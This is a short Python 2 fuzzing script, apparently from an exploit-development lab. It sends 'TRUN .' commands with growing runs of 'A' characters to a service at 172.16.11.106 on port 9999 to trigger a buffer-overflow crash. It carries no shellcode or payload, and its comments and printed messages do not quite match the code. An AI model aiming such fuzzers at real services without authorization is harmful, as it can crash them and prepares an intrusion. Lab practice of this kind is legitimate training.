#!/usr/bin/python
import socket,sys
# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=["A"]
counter=100
while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+200

for string in buffer:
        print "Fuzzing PASS with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.11.106',9999))
        s.send(('TRUN .' + string+'\r\n'))
        s.recv(1024)
        s.send('QUIT\r\n')
        s.close()
